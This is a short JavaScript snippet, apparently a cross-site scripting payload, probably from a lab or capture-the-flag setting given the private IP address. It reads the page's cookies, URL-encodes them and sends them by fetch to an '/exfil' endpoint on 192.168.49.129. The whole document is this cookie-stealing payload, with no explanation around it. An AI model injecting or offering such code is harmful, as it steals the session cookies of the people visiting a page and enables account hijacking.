let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("http://192.168.49.129/exfil?data=" + encodedCookie)
